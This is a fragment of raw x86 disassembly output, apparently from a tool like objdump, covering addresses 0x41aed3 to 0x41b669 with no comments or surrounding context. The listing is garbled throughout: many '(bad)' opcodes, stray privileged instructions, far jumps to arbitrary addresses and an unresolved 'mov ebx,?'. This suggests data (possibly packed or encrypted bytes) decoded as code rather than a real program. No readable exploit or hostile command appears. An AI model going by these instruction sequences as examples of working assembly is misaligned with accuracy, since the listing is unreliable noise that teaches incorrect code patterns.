  41aed3:	jl     0x41af34
  41aed5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aed6:	or     BYTE PTR [ebp+0x62],dh
  41aed9:	or     ecx,DWORD PTR [ecx-0x7cd7c1b5]
  41aedf:	(bad)  
  41aee0:	(bad)  
  41aee1:	and    esp,DWORD PTR [esi+0x37]
  41aee4:	jnp    0x41af2a
  41aee6:	push   cs
  41aee7:	mov    DWORD PTR [esi+0x1880fccc],esp
  41aeed:	scas   eax,DWORD PTR es:[edi]
  41aeee:	(bad)  [edi]
  41aef0:	dec    edx
  41aef1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aef2:	(bad)  
  41aef3:	(bad)  
  41aef4:	xor    eax,0xb224486d
  41aef9:	inc    eax
  41aefa:	fst    QWORD PTR [edx]
  41aefc:	mov    es,WORD PTR [ebx]
  41aefe:	inc    eax
  41aeff:	add    cl,ch
  41af01:	sub    esp,DWORD PTR [eax+ebp*1]
  41af04:	mov    dl,0x8b
  41af06:	or     al,0xfd
  41af08:	mov    bl,0xf8
  41af0a:	mov    BYTE PTR [eax+eax*1],al
  41af0d:	lods   eax,DWORD PTR ds:[esi]
  41af0e:	out    dx,eax
  41af0f:	das    
  41af10:	or     cl,ah
  41af12:	stos   DWORD PTR es:[edi],eax
  41af13:	sub    BYTE PTR [eax],bl
  41af15:	pop    esi
  41af16:	jae    0x41aedd
  41af18:	add    ebp,ebp
  41af1a:	mov    bl,0x28
  41af1c:	sub    al,0x55
  41af1e:	jne    0x41af1e
  41af20:	cld    
  41af21:	fst    QWORD PTR [esi]
  41af23:	xchg   DWORD PTR [ebx+0x7e],ebp
  41af26:	nop
  41af27:	mov    eax,esi
  41af29:	loope  0x41af5f
  41af2b:	fisttp QWORD PTR [edx-0x17c72bea]
  41af31:	jecxz  0x41af18
  41af33:	(bad)  
  41af34:	jmp    edi
  41af36:	stos   DWORD PTR es:[edi],eax
  41af37:	sub    BYTE PTR [edx+edi*4],bl
  41af3a:	fwait
  41af3b:	arpl   WORD PTR [eax],ax
  41af3d:	bound  ebx,QWORD PTR [ebp+0x2f7e244b]
  41af43:	inc    esp
  41af44:	and    al,0x76
  41af46:	sbb    al,0xa2
  41af48:	aas    
  41af49:	bound  edi,QWORD PTR [ecx+0x3b]
  41af4c:	and    al,0x3e
  41af4e:	pop    eax
  41af4f:	(bad)  
  41af50:	fs (bad) 
  41af52:	fldl2t 
  41af54:	xchg   DWORD PTR [ebp+0x21890284],esi
  41af5a:	mov    ch,0xd
  41af5c:	(bad)  
  41af5d:	adc    DWORD PTR [ebp-0x589a770b],esi
  41af63:	cdq    
  41af64:	fsub   QWORD PTR [ecx+edi*4-0x302f3c9c]
  41af6b:	retf   
  41af6c:	sbb    dh,BYTE PTR [esi+0xcd5b5]
  41af72:	(bad)  
  41af73:	sbb    DWORD PTR [edi],ecx
  41af75:	add    eax,ebp
  41af77:	sbb    BYTE PTR [esi-0x3d],ah
  41af7a:	mov    ebx,0xa10cb1da
  41af7f:	or     DWORD PTR [ebp+0x4f],ebx
  41af82:	inc    esi
  41af83:	fst    QWORD PTR [ecx]
  41af85:	retf   
  41af86:	jg     0x41af61
  41af88:	jmp    0xadf74915
  41af8d:	mov    BYTE PTR [ecx-0x4b],bh
  41af90:	mov    cl,0x0
  41af92:	scas   al,BYTE PTR es:[edi]
  41af93:	mov    ch,0x39
  41af95:	xchg   DWORD PTR [eax],esp
  41af97:	shl    dh,cl
  41af99:	in     al,dx
  41af9a:	jno    0x41b012
  41af9c:	pop    esi
  41af9d:	leave  
  41af9e:	std    
  41af9f:	addr16 ds add eax,0x81a25062
  41afa6:	mov    edx,0xa2172185
  41afab:	cdq    
  41afac:	popa   
  41afad:	pop    es
  41afae:	fisttp QWORD PTR [eax-0x4ad67218]
  41afb4:	loope  0x41af44
  41afb6:	jo     0x41af55
  41afb8:	repz inc ebx
  41afba:	bound  edx,QWORD PTR [ecx+0x1f]
  41afbd:	add    eax,ebx
  41afbf:	xchg   ebp,eax
  41afc0:	lds    edi,FWORD PTR [edi]
  41afc2:	jmp    0x19b5:0x218deb98
  41afc9:	mov    WORD PTR [edx],fs
  41afcb:	aam    0x0
  41afcd:	out    0xf3,al
  41afcf:	cmp    edx,DWORD PTR [ecx+0x6e]
  41afd2:	adc    dh,BYTE PTR [ebp+0x15007434]
  41afd8:	rcl    DWORD PTR [ebx+0x5e],1
  41afdb:	mov    al,0xcd
  41afdd:	mov    dl,0xaa
  41afdf:	(bad)  
  41afe0:	(bad)  
  41afe2:	fdivrp st(3),st
  41afe4:	cwde   
  41afe5:	add    bl,BYTE PTR [ecx-0x52db77c8]
  41afeb:	nop
  41afec:	(bad)  
  41afed:	shl    dh,cl
  41afef:	repz cwde 
  41aff1:	add    ebx,DWORD PTR [ecx-0x10bfbc98]
  41aff7:	sbb    BYTE PTR [eax+0x16648524],cl
  41affd:	push   ecx
  41affe:	push   ss
  41afff:	lock pop eax
  41b001:	vpminsw ymm1,ymm7,YMMWORD PTR [edi+0x5909b924]
  41b009:	retf   0x61e8
  41b00c:	push   eax
  41b00d:	dec    ebp
  41b00e:	int    0x6d
  41b010:	icebp  
  41b011:	jbe    0x41b033
  41b013:	(bad)  [di+0x4235]
  41b018:	xchg   ecx,eax
  41b019:	call   0xfc3ccf76
  41b01e:	bound  esp,QWORD PTR ds:0xef2e68b5
  41b024:	mov    bl,0x87
  41b026:	stos   BYTE PTR es:[edi],al
  41b027:	fwait
  41b028:	mov    al,ds:0x9ec27257
  41b02d:	mov    edi,0x3a036d1f
  41b032:	sti    
  41b033:	adc    ecx,esi
  41b035:	lea    ebp,[ebx]
  41b037:	(bad)  
  41b038:	les    ecx,FWORD PTR [eax]
  41b03a:	adc    eax,0x7f935a00
  41b03f:	test   eax,0x1b2ec0a5
  41b044:	mov    dl,0xc9
  41b046:	rol    BYTE PTR [eax],0x3d
  41b049:	adc    al,0xac
  41b04b:	add    DWORD PTR [ebp+0x14],ebp
  41b04e:	jnp    0x41b03c
  41b050:	jg     0x41b026
  41b052:	add    BYTE PTR [eax],al
  41b054:	pop    eax
  41b055:	retf   0x8b52
  41b058:	xlat   BYTE PTR ds:[ebx]
  41b059:	fistp  DWORD PTR [ecx+eax*1]
  41b05c:	jnp    0x41b035
  41b05e:	push   ebp
  41b05f:	mov    ecx,edi
  41b061:	(bad)  [ecx+eax*1]
  41b064:	dec    ebx
  41b065:	xlat   BYTE PTR ds:[ebx]
  41b066:	mov    edx,ebx
  41b068:	shr    ch,1
  41b06a:	jle    0x41b06b
  41b06c:	pop    ss
  41b06d:	lea    eax,[ecx+0x138a8cff]
  41b073:	xor    ebx,DWORD PTR [ecx+0x4b]
  41b076:	lds    edi,FWORD PTR [ecx+0xd353]
  41b07c:	push   esp
  41b07d:	and    eax,0xd363d263
  41b082:	add    BYTE PTR [eax],al
  41b084:	cmp    BYTE PTR [edx-0x556defdc],0x24
  41b08b:	adc    al,0xc8
  41b08d:	or     eax,0x7174487
  41b092:	cmp    edi,0xc144d10c
  41b098:	cmp    eax,esi
  41b09a:	dec    ebx
  41b09b:	lea    eax,[edi-0x47]
  41b09e:	and    al,0x50
  41b0a0:	add    BYTE PTR [edx],ch
  41b0a2:	sbb    BYTE PTR [eax+0x24],al
  41b0a5:	(bad)  
  41b0a7:	add    BYTE PTR [eax],al
  41b0a9:	retf   
  41b0aa:	dec    edi
  41b0ab:	push   0xf21cb24
  41b0b0:	in     al,dx
  41b0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0b2:	xchg   esi,eax
  41b0b3:	add    BYTE PTR [ebx+0x206fd6f3],al
  41b0b9:	push   ecx
  41b0ba:	aad    0x52
  41b0bc:	push   ebx
  41b0bd:	jbe    0x41b0df
  41b0bf:	cvttps2pi mm4,QWORD PTR [edx-0x6]
  41b0c3:	aas    
  41b0c4:	add    bh,ah
  41b0c6:	xor    BYTE PTR [edi+0xf],dl
  41b0c9:	dec    ecx
  41b0ca:	add    BYTE PTR ds:0x5982e7d8,0x99
  41b0d1:	push   ecx
  41b0d2:	xor    BYTE PTR [ebp+esi*8+0x6d],bh
  41b0d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0d7:	(bad)  
  41b0d8:	call   0x5d068f3d
  41b0dd:	or     al,0x3d
  41b0df:	cmp    eax,0xfef49e7f
  41b0e4:	jmp    DWORD PTR [edx-0x52]
  41b0e7:	or     al,0x0
  41b0e9:	scas   eax,DWORD PTR es:[edi]
  41b0ea:	xchg   eax,ebp
  41b0ec:	dec    esi
  41b0ed:	mov    ah,0x63
  41b0ef:	(bad)  
  41b0f0:	icebp  
  41b0f1:	fxch   st(0)
  41b0f3:	in     eax,dx
  41b0f4:	adc    edi,DWORD PTR ds:0x8f8b0845
  41b0fa:	mov    bl,0x6a
  41b0fc:	(bad)  
  41b0fd:	fsubr  DWORD PTR [edx-0x1c6617ba]
  41b103:	frndint 
  41b105:	add    dh,ah
  41b107:	scas   eax,DWORD PTR es:[edi]
  41b108:	push   eax
  41b109:	or     al,0xdf
  41b10b:	stc    
  41b10c:	dec    edx
  41b10d:	call   0x5e7aa1e4
  41b112:	sbb    ebp,DWORD PTR [esi-0x4fd00000]
  41b118:	in     eax,dx
  41b119:	cmc    
  41b11a:	mov    al,dh
  41b11c:	fdiv   DWORD PTR [ebx+0x46]
  41b11f:	or     BYTE PTR [esi],dh
  41b121:	dec    edi
  41b122:	in     eax,0xfc
  41b124:	pop    ss
  41b125:	push   ss
  41b126:	and    dh,al
  41b128:	sbb    al,0x44
  41b12a:	jle    0x41b118
  41b12c:	or     BYTE PTR [edx+eiz*4+0x2ffffc2d],dl
  41b133:	fisttp DWORD PTR [ebp+0x8f248f6]
  41b139:	mov    ch,0x5d
  41b13b:	(bad)  [edi]
  41b13d:	add    edx,DWORD PTR [edx]
  41b13f:	cli    
  41b140:	hlt    
  41b141:	mov    bh,0x50
  41b143:	cdq    
  41b144:	jmp    0x8c973ed5
  41b149:	fcom   DWORD PTR [ecx]
  41b14b:	mov    ch,0xb
  41b14d:	test   DWORD PTR [esi-0x29],ecx
  41b150:	psubb  mm5,QWORD PTR [edi+ebp*2]
  41b154:	fnstcw WORD PTR [ebx]
  41b156:	outs   dx,DWORD PTR ds:[esi]
  41b157:	xchg   ebp,eax
  41b158:	mov    eax,ds:0x62a30f32
  41b15d:	out    dx,al
  41b15e:	sub    eax,0xe103a9e3
  41b163:	sbb    dh,bl
  41b165:	or     eax,0xff4f8b4
  41b16a:	add    BYTE PTR [ecx+ebx*4-0x17],ch
  41b16e:	test   BYTE PTR [edi],bl
  41b170:	stc    
  41b171:	call   0xc432:0x26981f8c
  41b178:	sbb    ch,BYTE PTR [eax]
  41b17a:	or     edx,DWORD PTR [ebx-0x5e794572]
  41b180:	mov    ebp,0xf87333ed
  41b185:	mov    edx,0x52e8ad30
  41b18a:	in     eax,dx
  41b18b:	jmp    0xa9cf:0x99ee0318
  41b192:	add    esp,ecx
  41b194:	sbb    DWORD PTR [esi-0x2],edi
  41b197:	loop   0x41b1ba
  41b199:	jmp    0x41b186
  41b19b:	ja     0x41b12c
  41b19d:	outs   dx,BYTE PTR ds:[esi]
  41b19e:	push   eax
  41b19f:	inc    esi
  41b1a0:	leave  
  41b1a1:	fs into 
  41b1a3:	jno    0x41b151
  41b1a5:	push   si
  41b1a7:	data16 fist DWORD PTR [edi+eax*1-0x15]
  41b1ac:	(bad)  
  41b1ad:	(bad)  [edx+0xd1d11f]
  41b1b3:	cmp    ebx,edx
  41b1b5:	add    cl,ch
  41b1b7:	call   0xe11c99ac
  41b1bc:	jbe    0x41b1c2
  41b1be:	(bad)  
  41b1bf:	adc    ah,ah
  41b1c1:	xchg   DWORD PTR [edi],esi
  41b1c3:	scas   al,BYTE PTR es:[edi]
  41b1c4:	popa   
  41b1c5:	dec    ebx
  41b1c6:	icebp  
  41b1c7:	mov    DWORD PTR ds:0x6261e867,eax
  41b1cd:	fnstenv [edx+0x0]
  41b1d0:	sbb    al,0xd5
  41b1d2:	test   DWORD PTR [edi+0x33],esi
  41b1d5:	sub    BYTE PTR [eax+0x52c95dfd],cl
  41b1db:	outs   dx,BYTE PTR ds:[esi]
  41b1dc:	jae    0x41b1f6
  41b1de:	push   ss
  41b1df:	test   eax,0x5ecb5a61
  41b1e4:	jecxz  0x41b1db
  41b1e6:	je     0x41b1cc
  41b1e8:	call   0xbda21511
  41b1ed:	fucomi st,st(0)
  41b1ef:	stos   BYTE PTR es:[edi],al
  41b1f0:	xor    al,0xf5
  41b1f2:	sti    
  41b1f3:	jb     0x41b223
  41b1f5:	pop    ebx
  41b1f6:	fdivr  DWORD PTR [ebp+0x2efb5933]
  41b1fc:	xchg   ebx,eax
  41b1fd:	in     al,0x87
  41b1ff:	xor    cl,BYTE PTR [eax+eiz*2-0x3cc61498]
  41b206:	sti    
  41b207:	push   ss
  41b208:	xor    eax,0x1d62f161
  41b20d:	add    BYTE PTR [ecx-0x6d],bl
  41b210:	data16 fld DWORD PTR [edi+0x66a6f632]
  41b217:	call   0x9005147d
  41b21c:	sub    al,0x94
  41b21e:	push   edi
  41b21f:	inc    eax
  41b220:	and    DWORD PTR [esi-0x7df18dad],ecx
  41b226:	add    ah,dh
  41b228:	in     al,dx
  41b229:	frstor [esi-0x18]
  41b22c:	xchg   ecx,eax
  41b22d:	not    BYTE PTR ds:0x3be90700
  41b233:	add    BYTE PTR [eax],al
  41b235:	push   eax
  41b236:	adc    al,0x81
  41b238:	push   esp
  41b23a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b23b:	inc    eax
  41b23c:	dec    ax
  41b23e:	into   
  41b23f:	(bad)  
  41b240:	imul   esp,DWORD PTR [edi-0x4a],0xe0231066
  41b247:	inc    esp
  41b248:	enter  0xc75a,0x55
  41b24c:	dec    DWORD PTR [esi+0x7b400f33]
  41b252:	pop    eax
  41b253:	mov    esp,0xfb817675
  41b258:	push   esi
  41b259:	hlt    
  41b25a:	call   0xdd8cc842
  41b25f:	jg     0x41b221
  41b261:	(bad)  
  41b262:	hlt    
  41b263:	cld    
  41b264:	adc    eax,0x3be937
  41b269:	ror    BYTE PTR [edx],0x55
  41b26c:	dec    DWORD PTR [esi-0x19]
  41b26f:	adc    al,BYTE PTR [eax+0x3b]
  41b272:	vunpckhpd ymm3,ymm0,YMMWORD PTR [edi-0x37ffc417]
  41b27a:	pop    ds
  41b27b:	std    
  41b27c:	mov    edi,DWORD PTR [edi+ebp*4+0x5a]
  41b280:	ret    
  41b281:	mov    edx,0x3b0503fe
  41b286:	fist   DWORD PTR [ecx+0x55]
  41b289:	fmul   st(3),st
  41b28b:	out    0x55,eax
  41b28d:	into   
  41b28e:	test   eax,0xef1f4487
  41b293:	dec    ebx
  41b294:	mov    eax,DWORD PTR [ecx+0x63]
  41b297:	repz push ebp
  41b299:	add    BYTE PTR [esi+esi*4+0x24],cl
  41b29d:	and    al,0x9
  41b29f:	fild   DWORD PTR [eax]
  41b2a1:	add    BYTE PTR [edx-0x6f],dh
  41b2a4:	and    al,0x28
  41b2a6:	jb     0x41b259
  41b2a8:	and    al,0x2c
  41b2aa:	bound  ecx,QWORD PTR [edi]
  41b2ac:	in     al,dx
  41b2ad:	jmp    0x41b31e
  41b2af:	rol    BYTE PTR [ecx+eax*4],0xca
  41b2b3:	add    DWORD PTR [esp+edi*2+0x2c],edx
  41b2b7:	sbb    DWORD PTR [eax+0x24],0x56
  41b2bb:	add    BYTE PTR [ecx-0x762ad30e],cl
  41b2c1:	inc    ebx
  41b2c2:	neg    al
  41b2c4:	sub    ebp,DWORD PTR [eax+0x62]
  41b2c7:	cld    
  41b2c8:	(bad)  
  41b2c9:	(bad)  
  41b2ca:	out    dx,eax
  41b2cb:	jl     0x41b2ed
  41b2cd:	and    BYTE PTR [ebx+0x0],ah
  41b2d0:	add    BYTE PTR [edi+0x32],cl
  41b2d3:	imul   eax,DWORD PTR [eax+0x24],0x2beb7742
  41b2da:	push   esp
  41b2db:	rol    BYTE PTR [ecx+ecx*4],0x8a
  41b2df:	adc    ebx,0xfffffffe
  41b2e2:	jmp    0x3ebdca13
  41b2e7:	lock imul eax,DWORD PTR [eax],0x23807db7
  41b2ee:	add    BYTE PTR [ecx],0x0
  41b2f1:	add    cl,bl
  41b2f3:	scas   al,BYTE PTR es:[edi]
  41b2f4:	xor    al,0xd
  41b2f6:	sahf   
  41b2f7:	stos   DWORD PTR es:[edi],eax
  41b2f8:	das    
  41b2f9:	std    
  41b2fa:	push   edi
  41b2fb:	call   0x6241f2ed
  41b300:	jmp    0x41b2bc
  41b302:	jb     0x41b380
  41b304:	inc    esi
  41b305:	push   0x0
  41b307:	xchg   ebx,edi
  41b309:	dec    ebx
  41b30a:	and    al,0x76
  41b30c:	push   edx
  41b30d:	xchg   ecx,eax
  41b30e:	push   edx
  41b30f:	scas   eax,DWORD PTR es:[edi]
  41b310:	sub    eax,0x20464383
  41b315:	xor    BYTE PTR [ebx+0x1d],dl
  41b318:	cmp    al,0x1c
  41b31a:	sub    BYTE PTR [eax+0x0],ah
  41b31d:	add    BYTE PTR [eax],al
  41b31f:	jmp    0x41b2a4
  41b321:	sbb    ebp,DWORD PTR [ebx+ebx*8]
  41b324:	fadd   DWORD PTR [ebp+0x20]
  41b327:	xor    dh,dh
  41b329:	hlt    
  41b32a:	out    0x70,eax
  41b32c:	cdq    
  41b32d:	jmp    0x4d1980b2
  41b332:	jle    0x41b363
  41b334:	xchg   esi,eax
  41b335:	and    al,0x39
  41b337:	inc    ebp
  41b338:	sbb    eax,0xf5bdfef2
  41b33d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b33e:	or     cl,0xe4
  41b341:	call   0x6ed11549
  41b346:	pop    DWORD PTR [ecx+0x6203e8d5]
  41b34c:	mov    ds,WORD PTR [esi-0x26]
  41b34f:	call   0x94c29bfa
  41b354:	cwde   
  41b355:	repnz add BYTE PTR ds:0x1303e9d9,0x62
  41b35d:	push   esi
  41b35e:	pop    ds
  41b35f:	push   esi
  41b360:	fsubr  st,st(1)
  41b362:	add    eax,DWORD PTR [eax]
  41b364:	loope  0x41b377
  41b366:	fdivp  st(0),st
  41b368:	adc    BYTE PTR [edx-0x26ba69c9],ch
  41b36e:	jmp    0x535a9e76
  41b373:	into   
  41b374:	test   al,0x82
  41b376:	pop    ss
  41b377:	jmp    0x41b3db
  41b379:	fldl2t 
  41b37b:	mov    ah,BYTE PTR [ecx-0x6e751a43]
  41b381:	mov    ebp,0x8c6669d9
  41b386:	je     0x41b3c7
  41b388:	jle    0x41b343
  41b38a:	mov    ecx,0xc9bda98a
  41b38f:	jmp    0x41b3fe
  41b391:	sub    al,0x3
  41b394:	loope  0x41b381
  41b396:	jge    0x41b384
  41b398:	ficomp DWORD PTR [ebx]
  41b39a:	sub    ebx,esp
  41b39c:	arpl   WORD PTR [ecx-0x471b0a00],cx
  41b3a2:	and    al,0xe8
  41b3a4:	popa   
  41b3a5:	(bad)  [ebp+0x50bd3a2d]
  41b3ab:	shl    DWORD PTR [ebx+0x6ce9017c],1
  41b3b1:	sbb    DWORD PTR [eax],edi
  41b3b3:	stos   BYTE PTR es:[edi],al
  41b3b4:	mov    ebp,0x7a358e34
  41b3b9:	in     eax,0x1f
  41b3bb:	test   al,0x76
  41b3bd:	stos   BYTE PTR es:[edi],al
  41b3be:	repnz pop ds
  41b3c0:	js     0x41b422
  41b3c2:	inc    ebp
  41b3c3:	add    eax,0xa6528986
  41b3c8:	add    BYTE PTR [ebx+0x66291600],ch
  41b3ce:	xchg   edx,eax
  41b3cf:	test   DWORD PTR [ecx+0x1d68cc3b],ebp
  41b3d5:	cmp    ecx,ebx
  41b3d7:	add    BYTE PTR [esi+0x2915f88b],al
  41b3dd:	pop    dx
  41b3df:	leave  
  41b3e0:	jbe    0x41b413
  41b3e2:	xchg   ebx,eax
  41b3e3:	and    DWORD PTR [ebp-0x16040b9e],0x6a00e09f
  41b3ed:	cs cmc 
  41b3ef:	je     0x41b435
  41b3f1:	aad    0xe0
  41b3f3:	mov    bl,0x5c
  41b3f5:	mov    bh,BYTE PTR [ebp-0xa62aef0]
  41b3fb:	sti    
  41b3fc:	ds jmp 0xfb5a:0xabe17633
  41b404:	call   0x3d29b3a0
  41b409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b40a:	xor    ebp,eax
  41b40c:	xor    eax,0x83ed625b
  41b411:	pop    esi
  41b412:	div    BYTE PTR [ebp-0xb]
  41b415:	scas   eax,DWORD PTR es:[edi]
  41b416:	fld1   
  41b418:	add    BYTE PTR [esi],dl
  41b41a:	pop    es
  41b41b:	std    
  41b41c:	dec    DWORD PTR [eax+0x1774fd25]
  41b422:	pop    ecx
  41b423:	inc    edi
  41b424:	adc    al,0xca
  41b426:	xchg   ebp,eax
  41b427:	add    BYTE PTR [eax-0x4c],dl
  41b42a:	mov    al,ds:0xcb008014
  41b42f:	xlat   BYTE PTR ds:[ebx]
  41b430:	add    bh,bh
  41b432:	(bad)  
  41b433:	mov    bh,0x12
  41b435:	inc    eax
  41b436:	mov    ebx,0xbb14bea8
  41b43b:	mov    cl,0x89
  41b43d:	icebp  
  41b43e:	dec    eax
  41b43f:	or     bh,ch
  41b441:	je     0x41b3de
  41b443:	xchg   ebp,eax
  41b444:	(bad)  
  41b445:	push   ebp
  41b446:	cld    
  41b447:	lock retf 
  41b449:	adc    eax,0xff52dd7b
  41b44e:	xchg   esi,eax
  41b44f:	retf   
  41b450:	adc    al,BYTE PTR [eax-0x75]
  41b453:	test   eax,0xb05553c1
  41b458:	adc    WORD PTR [ecx-0x25],si
  41b45c:	mov    ecx,edi
  41b45e:	inc    eax
  41b45f:	fdiv   DWORD PTR [ebp-0x252a7f9]
  41b465:	adc    eax,0x3bf0df
  41b46a:	lock pop es
  41b46c:	cmp    esi,0x66218abc
  41b472:	jb     0x41b45a
  41b474:	imul   ebx,DWORD PTR [edx+edx*1],0x4c581095
  41b47b:	fwait
  41b47c:	enter  0xd451,0xb0
  41b480:	std    
  41b481:	adc    eax,0x3bf153
  41b486:	(bad)  
  41b487:	push   ss
  41b488:	jo     0x41b494
  41b48a:	in     eax,0x7
  41b48c:	sysenter 
  41b48e:	adc    eax,0x830097
  41b493:	bound  edi,QWORD PTR [edx-0x4526a332]
  41b499:	xor    DWORD PTR [ecx+0x21],ebx
  41b49c:	push   esi
  41b49d:	jnp    0x41b48a
  41b49f:	loope  0x41b485
  41b4a1:	sti    
  41b4a2:	cmp    BYTE PTR [edi-0x18],0xfe
  41b4a6:	push   ebp
  41b4a7:	xchg   ebp,eax
  41b4a8:	ja     0x41b476
  41b4aa:	xor    ah,ch
  41b4ac:	test   ecx,edx
  41b4ae:	jae    0x41b4df
  41b4b0:	test   DWORD PTR [ebx-0x8],eax
  41b4b3:	xor    dh,BYTE PTR [edx-0x4f31bd85]
  41b4b9:	pop    edx
  41b4ba:	add    ch,BYTE PTR ds:0x5737f41b
  41b4c0:	rol    BYTE PTR [ebx+eax*4],0xa2
  41b4c4:	mov    ch,0x19
  41b4c6:	mov    DWORD PTR [edi],esp
  41b4c8:	sub    BYTE PTR [edi+edi*4+0x477b102e],al
  41b4cf:	pusha  
  41b4d0:	jge    0x41b489
  41b4d2:	jae    0x41b511
  41b4d4:	pop    eax
  41b4d5:	pop    ecx
  41b4d6:	arpl   WORD PTR gs:[eax],ax
  41b4d9:	jge    0x41b4ca
  41b4db:	fbstp  TBYTE PTR [edx+0x58]
  41b4de:	push   ds
  41b4df:	out    dx,eax
  41b4e0:	mov    ebp,0xf5754fd8
  41b4e5:	(bad)  
  41b4e6:	push   ebp
  41b4e7:	clc    
  41b4e8:	std    
  41b4e9:	cmp    ch,bh
  41b4eb:	dec    edi
  41b4ec:	mov    eax,0x7d623ff3
  41b4f1:	les    esi,FWORD PTR [edx+0x6b]
  41b4f4:	ja     0x41b4b4
  41b4f6:	out    0x0,eax
  41b4f8:	into   
  41b4f9:	sbb    edi,edi
  41b4fb:	call   DWORD PTR [ecx+0x248931b2]
  41b501:	push   edx
  41b502:	mov    bh,0xc0
  41b504:	xchg   ecx,eax
  41b505:	push   edx
  41b506:	cmp    DWORD PTR [ecx-0x185311d8],ecx
  41b50c:	xlat   BYTE PTR ds:[ebx]
  41b50d:	fsub   DWORD PTR [edx]
  41b50f:	rcr    DWORD PTR [esi],1
  41b511:	pop    esi
  41b512:	sbb    al,BYTE PTR [edi+0x7cc36d0f]
  41b518:	push   ds
  41b519:	add    DWORD PTR [edx-0x2f],ebp
  41b51c:	push   es
  41b51d:	repnz outs dx,BYTE PTR ds:[esi]
  41b51f:	int3   
  41b520:	loopne 0x41b513
  41b522:	jne    0x41b511
  41b524:	mov    cs,WORD PTR [ebx-0x37ca090e]
  41b52a:	test   eax,0x29203303
  41b52f:	add    DWORD PTR [esi+ecx*1],edx
  41b532:	gs ret 
  41b534:	popfw  
  41b536:	mov    al,0x7c
  41b538:	sahf   
  41b539:	add    BYTE PTR [edi],cl
  41b53b:	imul   eax,ebp,0xc5c16ef1
  41b541:	lods   al,BYTE PTR ds:[esi]
  41b542:	inc    edx
  41b543:	add    esp,DWORD PTR [edx-0x6e]
  41b546:	adc    edi,DWORD PTR [esi-0x5e]
  41b549:	lea    esp,[esi-0x5d1824c7]
  41b54f:	test   BYTE PTR ds:0xeb0429cd,0xa
  41b556:	pop    edi
  41b557:	mov    ebx,0xd08b4085
  41b55c:	add    BYTE PTR [esi+0x6956aa5c],al
  41b562:	mov    edi,DWORD PTR [edx-0xa]
  41b565:	icebp  
  41b566:	int3   
  41b567:	sub    DWORD PTR [ecx+eiz*8],eax
  41b56a:	sbb    ch,dh
  41b56c:	add    eax,0xc4171604
  41b571:	popf   
  41b572:	(bad)  
  41b573:	test   BYTE PTR es:[ecx-0x4a],cl
  41b577:	nop
  41b578:	(bad)  
  41b579:	dec    ebp
  41b57a:	icebp  
  41b57b:	jmp    0x6ec966b4
  41b580:	fst    QWORD PTR [esi+0x4e27965e]
  41b586:	lods   al,BYTE PTR ds:[esi]
  41b587:	add    BYTE PTR [edx],dl
  41b589:	or     DWORD PTR [ecx+ecx*1+0x12f122e],ecx
  41b590:	jmp    0xba947ef6
  41b595:	xchg   esp,eax
  41b596:	pushf  
  41b597:	and    al,0xf5
  41b599:	push   ecx
  41b59a:	out    dx,al
  41b59b:	adc    eax,0xb10dad
  41b5a0:	jb     0x41b5cb
  41b5a2:	pop    esp
  41b5a3:	cld    
  41b5a4:	je     0x41b5af
  41b5a6:	mov    dl,BYTE PTR [edx-0x66]
  41b5a9:	ins    BYTE PTR es:[edi],dx
  41b5aa:	pushf  
  41b5ab:	and    al,0xc9
  41b5ad:	xor    esi,ebp
  41b5af:	adc    eax,0xb0da55
  41b5b4:	jb     0x41b55c
  41b5b6:	pop    ebx
  41b5b7:	cld    
  41b5b8:	out    0xe5,al
  41b5ba:	inc    ebp
  41b5bb:	add    ecx,ebp
  41b5bd:	popa   
  41b5be:	out    dx,al
  41b5bf:	adc    eax,0xb0ba0051
  41b5c4:	add    BYTE PTR [edx-0xb],dh
  41b5c7:	push   edi
  41b5c8:	inc    ebp
  41b5c9:	or     eax,0xae7af8b6
  41b5ce:	xchg   ebp,eax
  41b5cf:	in     eax,dx
  41b5d0:	test   BYTE PTR [ecx-0x737a8dc6],ch
  41b5d6:	cmp    ecx,ecx
  41b5d8:	lea    eax,ds:0xb487b53a
  41b5de:	xlat   BYTE PTR ds:[ebx]
  41b5df:	push   ss
  41b5e0:	add    ecx,ebp
  41b5e2:	popa   
  41b5e3:	add    ebp,edi
  41b5e5:	icebp  
  41b5e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5e7:	in     eax,dx
  41b5e8:	push   edx
  41b5e9:	sbb    dh,BYTE PTR [ecx]
  41b5eb:	mov    ebx,?
  41b5ed:	aam    0xb9
  41b5ef:	int3   
  41b5f0:	inc    eax
  41b5f1:	jmp    0x57c7b6ce
  41b5f6:	mov    ebx,0x61c14fc7
  41b5fb:	fld    DWORD PTR [eax]
  41b5fd:	stc    
  41b5fe:	nop
  41b5ff:	mov    cl,BYTE PTR [edi+0x0]
  41b602:	ficomp WORD PTR [esi]
  41b604:	vmread DWORD PTR [edi],ecx
  41b607:	pushf  
  41b608:	add    BYTE PTR [ebx+0x74f6626b],cl
  41b60e:	sub    DWORD PTR [edi],ebx
  41b610:	pinsrw mm3,WORD PTR [ecx],0x9c
  41b614:	add    BYTE PTR [eax+0x74],dl
  41b617:	repnz sbb edx,DWORD PTR [ebx+edi*4]
  41b61b:	fisttp DWORD PTR [ecx-0x1bd27f2a]
  41b621:	in     al,0x65
  41b623:	and    ch,bh
  41b625:	test   BYTE PTR [eax],al
  41b627:	dec    ebx
  41b628:	xchg   edx,eax
  41b629:	or     DWORD PTR [esi-0xc],edx
  41b62c:	lock pop ebx
  41b62e:	adc    al,0xbb
  41b630:	fstp   TBYTE PTR [edi-0x40]
  41b633:	aas    
  41b634:	(bad)  [ecx+0xf208d01]
  41b63a:	fs iret 
  41b63c:	fwait
  41b63d:	add    BYTE PTR [eax+edx*1-0x7074f26f],al
  41b644:	rcl    DWORD PTR [eax],0x85
  41b647:	or     ecx,DWORD PTR [eax+0x14038b05]
  41b64d:	std    
  41b64e:	(bad)  
  41b64f:	hlt    
  41b650:	push   ds
  41b651:	push   ebp
  41b652:	call   FWORD PTR [esi-0x74bfeb75]
  41b658:	mov    esi,0x1b015d5a
  41b65d:	pop    ecx
  41b65e:	cmp    DWORD PTR [edi-0x287c3e49],0xffffffeb
  41b665:	push   eax
  41b666:	push   ebp
  41b667:	lock (bad) 
  41b669:	and    al,0x1c
